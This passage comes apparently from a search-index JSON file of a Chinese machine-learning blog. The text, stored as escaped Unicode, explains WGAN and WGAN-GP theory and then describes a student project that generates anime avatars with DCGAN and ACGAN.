\u8fde\u7eed\u7684\u5b9a\u4e49\u4e0a\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u5b83\u9650\u5236\u4e86\u51fd\u6570\u68af\u5ea6\u7684\u4e0a\u9650\uff0c\u4f7f\u5f97\u4e00\u4e2a\u51fd\u6570\u7684\u51fd\u6570\u503c\u5c40\u90e8\u53d8\u52a8\u5e45\u5ea6\u53ea\u80fd\u5728\u4e00\u4e2a\u6709\u9650\u7684\u8303\u56f4\u5185\u3002</p> <p>\u6240\u4ee5\uff0c\u8ba1\u7b97 WD \u5c31\u6210\u4e86\uff0c\u5728 \\(f\\) \u7684 Lipschitz \u5e38\u6570\u4e0d\u8d85\u8fc7 K \u7684\u6761\u4ef6\u4e0b\uff0c\u627e\u51fa\u90a3\u4e2a\u7279\u6b8a\u7684\u6ee1\u8db3\u6761\u4ef6\u7684 \\(f\\) \u53d6\u5230\\(E_{x\\sim p_r}[f(x)]-E_{x\\sim p_\\theta}[f(x)]\\) \u7684\u4e0a\u754c\u3002</p> <p>\u4f3c\u4e4e\u627e\u5230\u8fd9\u4e2a\u6700\u4f18 \\(f\\) \u4e5f\u4e0d\u662f\u4e00\u4ef6\u5bb9\u6613\u7684\u4e8b\u60c5\uff1f\u795e\u7ecf\u7f51\u7edc\u6700\u5389\u5bb3\u7684\u4e0d\u5c31\u662f\u62df\u5408\u4e48\u3002\u3002\u6211\u4eec\u62ff\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\u6765\u62df\u5408\u3002\u3002\u4f46\u662f\u795e\u7ecf\u7f51\u7edc\u5728\u62df\u5408\u8fc7\u7a0b\u4e2d\u6ca1\u529e\u6cd5\u9650\u5236 f \u4f7f\u5f97\u5b83\u6ee1\u8db3 Lipschitz \u6761\u4ef6\u5440\uff1fWGAN \u539f\u8bba\u6587\u4e2d\u66b4\u529b\u7684\u5c06\u62df\u5408 f \u7684\u7f51\u7edc\u7684 w \u53c2\u6570\u5168\u90e8\u9650\u5236\u5728\u4e86[-c,c]\u4e4b\u95f4\uff08\u5c0f\u4e8e-c \u5c31\u4ee4\u4e3a-c\uff0c\u5927\u4e8e c \u5c31\u4ee4\u4e3a c\uff09\uff0c\u6765\u5f3a\u884c\u7684\u6ee1\u8db3\u4e86 Lipschitz \u6761\u4ef6\uff08f \u6700\u7ec8\u80af\u5b9a\u662f\u5173\u4e8e w \u7684\u51fd\u6570\uff0cw \u7684\u8303\u56f4\u53ea\u8981\u88ab\u9650\u5236\u4e86\uff0c\u90a3\u4e48 f \u7684\u5bfc\u6570\u6781\u9650\u4e5f\u88ab\u9650\u5236\u4f4f\u4e86\uff09\u3002</p> <p>\u4e8e\u662f\u5728 WGAN \u7684\u8bbe\u8ba1\u4e2d\uff0c\u539f\u672c\u7684 discriminator \u7f51\u7edc\u5176\u5b9e\u88ab\u6362\u6210\u4e86\u62df\u5408 \\(f\\) \u7684\u7f51\u7edc\u3002\u5bf9\u4e8e\u8fd9\u4e2a \\(f\\) \u7f51\u7edc\u7684\u8bad\u7ec3\uff0c\u5b83\u505a\u7684\u4e8b\u60c5\u5c31\u662f\u8981\u6700\u5927\u5316\uff1a</p> \\[ L=E_{x\\sim p_{data}}[f_w(x)]-E_{x\\sim p_g}[f_w(x)] \\] <p>\u5728\u8bad\u7ec3\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a \\(f\\) \u88ab\u671f\u671b\u80fd\u903c\u8fd1\u4f7f\u5f97 WD \u5bf9\u5076\u5f0f\u53d6\u4e0a\u786e\u754c\u65f6\u7684\\(f\\)\u3002</p> <p>\u800c generator \u8981\u5e72\u4ec0\u4e48\u5462\uff1f\u5b83\u5c31\u662f\u8d1f\u8d23\u6700\u5c0f\u5316\u8fd9\u4e2a L\uff0c\u56e0\u4e3a \\(f\\) \u7f51\u7edc\u7684\u8bad\u7ec3\u4e3b\u8981\u662f\u8c03\u6574 \\(f\\) \u53d6\u4e0a\u786e\u754c\uff0c\u4f7f\u5f97 L \u903c\u8fd1 WD\uff0cg \u7f51\u7edc\u5219\u8d1f\u8d23\u964d\u4f4e\u8fd9\u4e2a WD\uff0c\u4f7f\u5f97\u4e24\u4e2a\u5206\u5e03\u88ab\u8d34\u5408\u3002</p> <p>\u4f60\u8bf4\u5de7\u4e0d\u5de7\uff1f\u660e\u660e discriminator \u5df2\u7ecf\u4e0d\u518d\u662f\u90a3\u4e2a\u8d1f\u8d23\u5224\u522b\u7684 discriminator\uff0c\u800c\u662f\u88ab\u7528\u6765\u62df\u5408\u4e00\u4e2a\u4e0d\u660e\u610f\u4e49\u7684\\(f\\)\uff0c\u4e24\u4e2a\u7f51\u7edc\u4e4b\u95f4\u7adf\u7136\u8fd8\u662f\u5b58\u5728\u4e00\u4e2a minimax \u535a\u5f08\uff01</p> <p>\u6700\u540e\uff0c\u9644\u4e0a WGAN \u7684\u4f2a\u4ee3\u7801\uff0c\u5176\u5b9e\u53d8\u5316\u4e0d\u5927\uff1a</p> <p></p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#wgan-gp","title":"WGAN-GP","text":"<p>WGAN \u8bba\u6587\u4e2d\uff0c\u4f5c\u8005\u4e5f\u8bf4\u4e86\uff0c\u91c7\u7528 clip \u6765\u4fdd\u8bc1 Lipschitz \u6761\u4ef6\u975e\u5e38\u7c97\u66b4\uff0c\u7b80\u964b\uff0c\u9f13\u52b1\u5927\u5bb6\u63d0\u51fa\u4e00\u4e9b\u65b0\u7684\u60f3\u6cd5\u3002WGAN-GP \u5c31\u662f\u4e00\u4e2a\u66ff\u4ee3\u7b56\u7565\uff0c\u5b83\u5728 Loss \u91cc\u9762\u6dfb\u52a0\u4e86\u4e00\u4e2a Gradient penalty \u9879\uff0c\u6709\u70b9\u7c7b\u4f3c\u6b63\u5219\u5316\u9879\uff0c\u4f46\u662f\u8fd9\u91cc\u7684 GP \u9879\u4e3b\u8981\u662f\u4e3a\u4e86\u9650\u5236 f \u7f51\u7edc\u4e2d\u7684\u53c2\u6570\uff0c\u8ba9\u5b83\u6ee1\u8db3 Lipschitz \u6761\u4ef6\u3002\u76f8\u5bf9\u800c\u8a00\uff0c\u66f4\u7075\u6d3b\u4e00\u70b9\u3002</p> <p>\u5177\u4f53\u7684\u4ecb\u7ecd\u53ef\u4ee5\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff0c\u6211\u4eec\u4e0d\u518d\u5c55\u5f00\u8ba8\u8bba\u3002</p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/","title":"\u57fa\u4e8e GAN \u7684\u52a8\u6f2b\u5934\u50cf\u751f\u6210","text":"<p>\u672c\u7bc7\u535a\u5ba2\u4ecb\u7ecd\u4e86\u57fa\u4e8e\u751f\u6210\u5f0f\u5bf9\u6297\u7f51\u7edc\uff08GAN\uff09\u7684\u52a8\u6f2b\u5934\u50cf\u751f\u6210\u9879\u76ee\u3002\u6587\u7ae0\u8be6\u7ec6\u63cf\u8ff0\u4e86\u9879\u76ee\u7684\u80cc\u666f\u3001\u5b9e\u73b0\u8fc7\u7a0b\u3001\u5b9e\u9a8c\u7ed3\u679c\u4ee5\u53ca\u9047\u5230\u7684\u95ee\u9898\u548c\u6539\u8fdb\u65b9\u6cd5\u3002\u901a\u8fc7\u65e0\u6761\u4ef6\u751f\u6210\u548c\u6761\u4ef6\u751f\u6210\uff08ACGAN\uff09\u4e24\u79cd\u65b9\u5f0f\uff0c\u4f5c\u8005\u5b9e\u73b0\u4e86\u5bf9\u52a8\u6f2b\u5934\u50cf\u7684\u751f\u6210\u548c\u7279\u5f81\u63a7\u5236\uff0c\u5e76\u63a2\u8ba8\u4e86 GAN \u7684\u7406\u8bba\u95ee\u9898\u53ca\u4f18\u5316\u65b9\u5411\u3002\u6700\u7ec8\uff0c\u6587\u7ae0\u5c55\u793a\u4e86\u5b9e\u9a8c\u6210\u679c\u5e76\u63d0\u51fa\u4e86\u672a\u6765\u7684\u4f18\u5316\u7a7a\u95f4\uff0c\u5305\u62ec\u6539\u8fdb\u6a21\u578b\u8bbe\u8ba1\u3001\u4f7f\u7528\u66f4\u4f18\u8d28\u7684\u6570\u636e\u96c6\u4ee5\u53ca\u751f\u6210\u66f4\u9ad8\u5206\u8fa8\u7387\u7684\u56fe\u7247\u3002</p> <p>Github Repo :https://github.com/Unispac/Animation-Avatar-Generation</p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/#\u9879\u76ee\u6765\u6e90","title":"\u9879\u76ee\u6765\u6e90","text":"<p>\u672c\u9879\u76ee\u5b9e\u8df5\u4e86\u57fa\u4e8e GAN \u7684\u52a8\u6f2b\u5934\u50cf\u751f\u6210\u3002</p> <p>\u60f3\u6cd5\u6765\u6e90\u4e8e\u4e00\u4e2a\u540d\u4e3a MakeGirlsMoe \u7684\u52a8\u6f2b\u4eba\u7269\u751f\u6210\u9879\u76ee\uff1a</p> <p></p> <p>\u8be5\u9879\u76ee\u662f\u7531\u4e00\u7ec4\u6765\u81ea\u590d\u65e6\u5927\u5b66\u548c CMU \u7684\u5b66\u751f\u8bbe\u8ba1\u7684\uff0c\u66fe\u7ecf\u4e00\u5ea6\u5728 github trend \u4e0a\u8dfb\u8eab Top 5\uff0c\u5e76\u4e14\u767b\u4e0a\u8fc7\u65e5\u672c\u96c5\u864e\u7684\u9996\u9875\u3002\u9879\u76ee\u57fa\u4e8e GAN \u7684\u56fe\u50cf\u751f\u6210\u6280\u672f\uff0c\u5141\u8bb8\u7528\u6237\u8bbe\u7f6e\u7279\u5f81\u53c2\u6570\u63a7\u5236\u52a8\u6f2b\u4eba\u7269\u7684\u81ea\u52a8\u751f\u6210\u3002</p> <p>\u5e76\u4e14\uff0c\u9879\u76ee\u539f\u4f5c\u8005\u5728\u6700\u65b0\u53d1\u5e03\u7684\u9879\u76eeCrypko\u4e2d\u66f4\u662f\u5b9e\u73b0\u4e86\u4eba\u7269\u8fde\u7eed\u53d8\u5316\u7684\u7cbe\u786e\u63a7\u5236\uff0c\u4f7f\u5f97\u901a\u8fc7 GAN \u751f\u6210\u98ce\u683c\u8fde\u8d2f\u7684\u52a8\u753b\u6210\u4e3a\u53ef\u80fd\uff1a</p> <p></p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd9\u4e00\u89d2\u8272\u751f\u6210\u6280\u672f\u5728 2D \u7ed8\u56fe\u8f85\u52a9\u8bbe\u8ba1\u4e0a\u4e5f\u8868\u73b0\u4e0d\u4fd7\uff1a</p> <p></p> <p>\u53ef\u4ee5\u9884\u89c1\uff0c\u5728\u52a8\u753b\u5f71\u89c6\u4ea7\u4e1a\u9ad8\u901f\u589e\u957f\u7684\u4eca\u5929\uff0c\u4e00\u4e2a\u6210\u719f\u7684\u81ea\u52a8\u4f5c\u753b/\u8f85\u52a9\u4f5c\u753b\u7684 AI \u7cfb\u7edf\u6709\u7740\u975e\u5e38\u5927\u7684\u5e02\u573a\u7a7a\u95f4\u3002</p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/#\u9879\u76ee\u5185\u5bb9\u6982\u8ff0","title":"\u9879\u76ee\u5185\u5bb9\u6982\u8ff0","text":"<p>\u5728\u5b9e\u73b0\u8fd9\u4e2a\u9879\u76ee\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u9605\u8bfb\u539f\u8bba\u6587\u548c\u4e00\u4e9b\u8f85\u52a9\u6750\u6599\uff0c\u5bf9 GAN \u7684\u6280\u672f\u6709\u4e86\u4e00\u4e2a\u521d\u6b65\u7684\u4e86\u89e3\u3002\u53d7\u9650\u4e8e\u65f6\u95f4\u548c\u4eba\u529b\uff0c\u6211\u4eec\u53ea\u5b9e\u73b0\u4e86 64*64 \u52a8\u6f2b\u5934\u50cf\u751f\u6210\uff0c\u5148\u540e\u57fa\u4e8e DCGAN \u548c ACGAN \u7684\u65b9\u6cd5\u5b9e\u73b0\u4e86\u65e0\u6761\u4ef6\u751f\u6210\u548c\u6761\u4ef6\u7ea6\u675f\u751f\u6210\u3002</p> <p>\u6570\u636e\u96c6\u6765\u81ea\u53f0\u6e7e\u5927\u5b66\u674e\u5b8f\u6bc5\u8001\u5e08\u5f00\u8bbe\u7684\u8bfe\u7a0b\uff1aMLDS\u3002</p> <p>\u5728\u5b9e\u9a8c\u4e2d\uff0c\u6211\u4eec\u9a8c\u8bc1\u548c\u7814\u7a76\u4e86 GAN \u5728\u7406\u8bba\u4e0a\u5b58\u5728\u7684\u4e00\u4e9b\u95ee\u9898\u4ee5\u53ca\u6f5c\u5728\u7684\u89e3\u51b3\u65b9\u6cd5\u3002\u6211\u4eec\u4f7f\u7528\u539f\u8bba\u6587\u4e2d\u63d0\u4f9b\u7684\u7b97\u6cd5\u751f\u6210\u56fe\u50cf\u65f6\u4e5f\u9047\u5230\u4e86\u5f88\u591a\u95ee\u9898\uff0c\u901a\u8fc7\u4e00\u4e9b\u5206\u6790\uff0c\u6211\u4eec\u63d0\u51fa\u4e86\u4e00\u4e9b\u6539\u8fdb\u624b\u6bb5\uff0c\u6700\u540e\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4f18\u5316\u4e86\u751f\u6210\u7ed3\u679c\uff0c\u5b9e\u73b0\u4e86\u53ef\u63a5\u53d7\u7684\u751f\u6210\u6548\u679c\uff1a</p> <p></p> <p>\u6211\u4eec\u5c06\u4f1a\u7b80\u5355\u7684\u4ecb\u7ecd\u6211\u4eec\u7684\u5b9e\u9a8c\u5185\u5bb9\u548c\u9047\u5230\u7684\u95ee\u9898\uff0c\u7ed9\u51fa\u4e00\u4e9b\u5206\u6790\u548c\u89e3\u51b3\u65b9\u6cd5\u3002\u6700\u7ec8\u6211\u4eec\u5c06\u5206\u6790\u5b9e\u9a8c\u7ed3\u679c\u53ca\u5176\u6f5c\u5728\u7684\u4f18\u5316\u7a7a\u95f4\u3002</p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/#gan-\u53ca\u5176\u56fa\u6709\u7684\u95ee\u9898","title":"GAN \u53ca\u5176\u56fa\u6709\u7684\u95ee\u9898","text":"<p>\u751f\u6210\u5f0f\u5bf9\u6297\u7f51\u7edc\u662f 2014 \u5e74\u7531 Goodfellow \u7b49\u4eba\u5728\u300aGenerative Adversarial Net\u300b\u4e2d\u63d0\u51fa\u7684\u3002</p> <p>\u5728 GAN \u4e2d\u4e00\u7ec4 Generator \u548c Discriminator \u901a\u8fc7\u5bf9\u4e0b\u9762\u8fd9\u4e2a\u5f0f\u5b50\u8fdb\u884c minimax \u535a\u5f08\uff0c\u5b9e\u73b0\u751f\u6210\u51c6\u786e\u5ea6\u7684\u81ea\u5f3a\u5316\u5b66\u4e60\uff1a</p> <p></p> <p>\u539f\u8bba\u6587\u5bf9\u6b64\u505a\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u8bc1\u660e\uff0c\u5f53 Discriminator \u8fbe\u5230\u81ea\u5df1\u7684\u7eb3\u4ec0\u5747\u8861\u7684\u65f6\u5019\uff0cGenerator \u7684\u76ee\u6807\u51fd\u6570\u7b49\u4ef7\u4e8e\u751f\u6210\u5668\u4ea7\u751f\u7ed3\u679c\u7684\u5206\u5e03\\(p_g\\)\u548c\u8bad\u7ec3\u96c6\u6570\u636e\u5206\u5e03\\(p_{data}\\)\u7684 JS \u6563\u5ea6\u3002\u4e8e\u662f\u4ece\u7406\u8bba\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230 G \u548c D \u7684\u5bf9\u6297\u535a\u5f08\u672c\u8d28\u4e0a\u5f0f\u4e00\u4e2a\\(p_g\\)\u5411\\(p_{data}\\)\u62df\u5408\u7684\u8fc7\u7a0b\u3002</p> <p>\u76f8\u5bf9\u4e8e\u7ecf\u5178\u7684 VAE \u65b9\u6cd5\uff0cGAN \u6452\u5f03\u5411\u91cf\u5dee\u8303\u6570\u8fd9\u79cd\u76f8\u5bf9\u673a\u68b0\u7684\u8bc4\u4f30\u65b9\u6cd5\uff0c\u800c\u91c7\u7528\u4e86\u4e00\u4e2a Discriminator \u7f51\u7edc\u6765\u505a\u51fa\u66f4\u52a0\u590d\u6742\u7684\u8bc4\u4f30\uff0c\u56e0\u6b64 Generator \u4e5f\u80fd\u66f4\u597d\u7684\u5b66\u5230\u50cf\u7d20\u70b9\u4e4b\u95f4\u7684 correlation\u3002</p> <p>Goodfellow \u63d0\u51fa\u7684\u521d\u4ee3 GAN \u7248\u672c\u5728\u5e94\u7528\u4e2d\u53d6\u5f97\u4e86\u5f88\u591a\u51fa\u8272\u7684\u8868\u73b0\uff0c\u4f46\u662f\u4e5f\u4e00\u76f4\u5b58\u5728\u96be\u4ee5\u8bad\u7ec3\u7684\u95ee\u9898\u3002\u5728\u8bad\u7ec3\u7684\u65f6\u5019\u7ecf\u5e38\u4f1a\u53d1\u73b0\u5f53 Discriminator \u8bad\u7ec3\u5f97\u592a\u597d\u7684\u65f6\u5019\uff0cGenerator \u8bad\u7ec3\u65f6\u5c31\u4f1a\u51fa\u73b0\u68af\u5ea6\u6d88\u5931\u7684\u73b0\u8c61\u3002Goodfellow \u4e5f\u539f\u6587\u4e2d\u4e5f\u63d0\u5230\u8fc7\u8fd9\u4e2a\u95ee\u9898\uff0c\u9519\u8bef\u7684\u628a\u539f\u56e0\u5f52\u7ed3\u4e3a saturation\uff0c\u5e76\u4e14\u63d0\u51fa\u628a generator \u8bad\u7ec3\u65f6\u4f7f\u7528\u7684 log(1-D(G(z))) \u6362\u6210-log(D(G(z)))\uff0c\u7ed3\u679c\u662f\u8fd9\u4e2a\u66ff\u4ee3\u9009\u9879\u7ecf\u5e38\u51fa\u73b0\u68af\u5ea6\u4e0d\u7a33\u5b9a\u7684\u73b0\u8c61\u3002</p> <p>\u4ece 2014 \u5e74\u5f00\u59cb\uff0c\u5c31\u4e0d\u65ad\u6709\u5404\u79cd\u5404\u6837\u7684\u5173\u4e8e GAN \u7684\u7814\u7a76\uff0c\u5927\u591a\u6570\u58f0\u79f0\u5bf9\u4e8e\u539f\u59cb\u7248\u672c GAN \u7684\u6539\u8fdb\u90fd\u662f\u901a\u8fc7\u5b9e\u9a8c\u6311\u9009\u51fa\u66f4\u52a0\u597d\u7684\u7f51\u7edc\u67b6\u6784\u548c\u8d85\u53c2\u6570\u8bbe\u7f6e\uff0c\u4f46\u662f\u90fd\u6ca1\u6709\u5f7b\u5e95\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002</p> <p>2017 \u5e74 Arjovsky \u53d1\u8868\u7684\u4e24\u7bc7\u8bba\u6587\u300aTOWARDS PRINCIPLED METHODS FOR TRAINING GENERATIVE ADVERSARIAL NETWORKS\u300b\u548c\u300aWasserstein GAN\u300b\u5f15\u8d77\u4e86\u5e7f\u6cdb\u7684\u5173\u6ce8\u3002\u524d\u8005\u4ece\u7406\u8bba\u4e0a\u7ed9\u51fa\u4e86\u4e0a\u8ff0\u95ee\u9898\u51fa\u73b0\u7684\u539f\u56e0\uff0c\u540e\u8005\u63d0\u51fa\u4e86 WGAN \u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>Arjovsky \u4ece\u6570\u5b66\u4e0a\u8bc1\u660e\u4e86 JS \u6563\u5ea6\u5bf9\u4e8e\\(p_{data}\\)\u548c\\(p_g\\)\u4e4b\u95f4\u7684\u8ddd\u79bb\u8861\u91cf\u5728\u4e24\u8005\u91cd\u53e0\u90e8\u5206\u6d4b\u5ea6\u4e3a 0 \u7684\u65f6\u5019\u662f\u4e00\u4e2a\u5e38\u6570\u3002\u800c\u7531\u4e8e\\(p_{data}\\)\u548c\\(p_g\\)\u7684\u652f\u6491\u96c6\u5728\u9ad8\u7ef4\u56fe\u50cf\u7a7a\u95f4\u4e2d\u90fd\u662f\u4f4e\u7ef4\u6d41\u5f62\uff0c\u56e0\u6b64\u4e24\u8005\u91cd\u53e0\u90e8\u5206\u7684\u671f\u671b\u6d4b\u5ea6\u4e5f\u7684\u786e\u662f 0\u3002\u3002\u3002\u8fd9\u6b63\u662f\u7528 JS \u6563\u5ea6\u6765\u4f5c\u4e3a G \u7684\u535a\u5f08\u5747\u8861\u76ee\u6807\u65f6\u68af\u5ea6\u6d88\u5931\u7684\u6839\u672c\u539f\u56e0\u3002\u540c\u65f6 Goodfellow \u7ed9\u51fa\u7684\u66ff\u4ee3\u76ee\u6807\u51fd\u6570\u5728\u7ecf\u8fc7\u7b80\u5355\u7684\u6570\u5b66\u53d8\u6362\u540e\u5448\u73b0\u5904 KL-JS \u7684\u5f62\u5f0f\uff0c\u5176\u5b9e\u662f\u4e00\u5bf9\u4e92\u76f8\u77db\u76fe\u7684\u76ee\u6807\uff0c\u56e0\u6b64\u624d\u4f1a\u9020\u6210\u68af\u5ea6\u4e0d\u7a33\u5b9a\u3002</p> <p>\u56e0\u6b64\uff0cArjovsky \u63d0\u51fa\u7528 Wasserstein Distance \u6765\u66ff\u4ee3 JS \u6563\u5ea6\u3002\u867d\u7136 Wasserstein Distance \u4e0d\u53ef\u76f4\u63a5\u7ed3\u7b97\uff0cArjovsky \u4f7f\u7528\u4e86\u4e00\u4e2a\u6570\u5b66\u5b9a\u7406\u8bc1\u660e\u4e86\u5176\u7b49\u4ef7\u7684\u5bf9\u5076\u5f0f\uff0c\u6700\u540e\u63d0\u51fa\u5c06 Discriminator \u66ff\u6362\u6210\u4e00\u4e2a\u62df\u5408\u8fd9\u4e2a\u5bf9\u5076\u5f0f\u7684\u7f51\u7edc\uff0c\u5e76\u901a\u8fc7 weight clip \u7684\u624b\u6bb5\u6765\u6ee1\u8db3\u8fd9\u4e2a\u5bf9\u5076\u5f0f\u5fc5\u9700\u7684 Lipschitz \u6761\u4ef6\u3002</p> <p>\u5c3d\u7ba1\u540e\u6765\u6709\u8bf8\u5982 WGAN-GP \u8fd9\u6837\u7684\u65b9\u6cd5\u63d0\u51fa\u7528 Gradient Penalty \u66f4\u597d\u7684\u6765\u6ee1\u8db3 Lipschitz \u6761\u4ef6\uff0c\u4f46\u662f\u6211\u4eec\u5728\u5b9e\u9a8c\u4e2d\u53d1\u73b0\uff0cWGAN-GP \u867d\u7136\u53ef\u80fd\u514b\u670d\u4e86 DCGAN \u5bb9\u6613\u51fa\u73b0\u68af\u5ea6\u6d88\u5931\u7684\u95ee\u9898\uff0c\u4f46\u662f\u5728 DCGAN \u6b63\u5e38\u8bad\u7ec3\u7684\u60c5\u51b5\u4e0b\uff0cWGAN-GP \u548c WGAN \u7684\u751f\u6210\u7684\u6548\u679c\u5374\u4e0d\u5982 DCGAN\u3002</p> <p></p> <p>\u5728\u91c7\u7528\u540c\u6837\u7684\u67b6\u6784\uff08WGAN-GP \u4e2d\u4ec5\u4ec5\u662f\u628a Discriminator \u4e2d\u7684 norm \u5c42\u53bb\u6389\uff0c\u4e14\u8f93\u51fa\u4e0d\u518d\u52a0\u4e0a sigmoid \u9650\u5236\uff09\u65f6\uff0c\u6211\u4eec\u53d1\u73b0 WGAN-GP \u751f\u6210\u7684\u7ed3\u679c\u4e2d\uff0c\u989c\u8272\u5f3a\u5ea6\u5f88\u5927\uff0c\u751f\u6210\u7684\u7ed3\u679c\u4e0d\u591f\u67d4\u548c\uff0c\u6e05\u6670\u5ea6\u4e5f\u4e0d\u5982\u6210\u529f\u8bad\u7ec3\u51fa\u6765\u7684 DCGAN\u3002\u6211\u4eec\u8ba4\u4e3a\u53ef\u80fd\u5b58\u5728\u7684\u95ee\u9898\u4e3b\u8981\u6709\uff1aWGAN-GP \u4e2d wasserstein distance \u5bf9\u5076\u5f0f\u7684\u62df\u5408\u9700\u8981\u66f4\u52a0\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u7f51\u7edc\uff1b\u9700\u8981\u66f4\u597d\u7684\u8c03\u6574\u53c2\u6570\u4fdd\u6301\u4e00\u4e2a\u9002\u5f53\u7684 Lipschitz \u5e38\u6570\u3002\u7531\u4e8e\u65f6\u95f4\u539f\u56e0\uff0c\u6211\u4eec\u6700\u7ec8\u6ca1\u529e\u6cd5\u5bf9\u8fd9\u4e9b\u6539\u8fdb\u7684\u60f3\u6cd5\u505a\u9a8c\u8bc1\u3002</p> <p>\u5728\u5bf9 GAN \u8fdb\u884c\u5b66\u4e60\u548c\u7814\u7a76\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e5f\u6574\u7406\u4e86\u53e6\u5916\u4e24\u7bc7\u6587\u6863\u6765\u8be6\u7ec6\u7684\u8ba8\u8bba GAN \u7684\u601d\u60f3\u548c\u7406\u8bba\u63a8\u5bfc\uff0c\u5206\u522b\u6536\u5f55\u5728\uff1aGAN \u7684\u57fa\u672c\u60f3\u6cd5\uff0cGAN \u7684\u7406\u8bba\u3002</p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/#\u65e0\u6761\u4ef6\u751f\u6210","title":"\u65e0\u6761\u4ef6\u751f\u6210","text":"<p>\u65e0\u6761\u4ef6\u751f\u6210\u65f6\uff0c\u6211\u4eec\u91c7\u7528\u4e86\u4e00\u4e2a DCGAN \u67b6\u6784\u5b9e\u9a8c\u3002</p> <p>\u91c7\u7528\u7684\u57fa\u672c\u7684\u67b6\u6784\u5982\u4e0b\uff1a</p> <p></p> <p>\u5b9e\u9a8c\u65f6\u91c7\u7528\u7684\u51e0\u4e2a trick\uff1a</p> <ul> <li> <p>Discriminator \u548c Generator \u90fd\u52a0\u4e0a BatchNormalization\u3002</p> </li> <li> <p>\u8bad\u7ec3\u56fe\u7247\u7684\u901a\u9053\u5206\u91cf\u7edf\u4e00\u9664\u4ee5 127.5 \u540e\u51cf 1\uff0c\u9650\u5236\u5728 -1 \u548c 1 \u4e4b\u95f4\uff0c\u4ea7\u751f\u7684\u56fe\u7247\u7531 tanh \u5c06\u5206\u91cf\u7ea6\u675f\u5728 -1~1 \u4e4b\u95f4\u3002</p> </li> <li> <p>\u8f93\u5165\u7684\u56fe\u7247\u4f1a\u4ee5\u4e00\u5b9a\u6982\u7387\u5206\u5e03\u88ab\u968f\u673a\u7684\u5de6\u53f3\u7ffb\u8f6c\u4ee5\u53ca\u6b63\u9006\u65f6\u9488\u8f7b\u5fae\u65cb\u8f6c\uff0c\u57f9\u517b\u6a21\u578b\u5bf9\u5bf9\u79f0\u6027\u7684\u7406\u89e3\u3002</p> </li> <li> <p>Z \u7684\u4ece\u4e00\u4e2a\u5747\u503c\u4e3a 0\uff0c\u6807\u51c6\u5dee\u4e3a\\(e^{\\frac{-1}{\\Pi}}\\)\u7684\u6b63\u6001\u5206\u5e03\u4e2d\u53d6\u6837\u3002</p> </li> </ul> <p>\u751f\u6210\u6548\u679c\uff1a</p> <ul> <li>After 1 Epoch</li> </ul> <p></p> <ul> <li>After 3 Epoches</li> </ul> <p></p> <ul> <li>After 10 Epoches</li> </ul> <p></p> <ul> <li>After 30 Epoches</li> </ul> <p></p> <ul> <li>After 50 Epoches</li> </ul> <p></p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/#\u6761\u4ef6\u751f\u6210","title":"\u6761\u4ef6\u751f\u6210","text":"<p>\u5728\u65e0\u6761\u4ef6\u751f\u6210\u4e2d\uff0cGAN \u505a\u7684\u662f\u62df\u5408\u7531 z \u5206\u5e03\u4ee5\u53ca generator \u53c2\u6570\u5171\u540c\u9690\u5f0f\u5b9a\u4e49\u7684\u751f\u6210\u5206\u5e03\\(g_p\\)\u548c\u6570\u636e\u96c6\u5206\u5e03\\(d_{data}\\)\u3002\u56e0\u6b64\uff0c\u751f\u6210\u5668\u80fd\u505a\u5230\u7684\u53ea\u662f\u7ed9\u5b9a\u4e00\u4e2a z \u5206\u5e03\u4e2d\u91c7\u6837\u7684\u5411\u91cf\uff0c\u7136\u540e\u751f\u6210\u4e00\u4e2a\u5c3d\u53ef\u80fd\u771f\u5b9e\u7684\u56fe\u7247\u3002</p> <p>Conditional GAN \u5141\u8bb8\u6211\u4eec\u63d0\u4f9b\u6761\u4ef6\uff0c\u5bf9\u6761\u4ef6\u6982\u7387\u62df\u5408\uff0c\u751f\u6210\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c\u3002\u6211\u4eec\u4f7f\u7528 ACGAN \u5b9e\u73b0\u4e86\u751f\u6210\u8fc7\u7a0b\u4e2d\u5bf9\u5934\u53d1\u989c\u8272\u4ee5\u53ca\u773c\u775b\u989c\u8272\u7684\u63a7\u5236\u3002</p>"},{"location":"blog/2019/06/16/%E5%9F%BA%E4%BA%8E-gan-%E7%9A%84%E5%8A%A8%E6%BC%AB%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/#acgan","title":"ACGAN","text":"<p>\u6211\u4eec\u91c7\u7528\u4e86 ACGAN\uff08\u300aConditional Image Synthesis With Auxiliary Classifier GANs\u300b, Odena A et. al 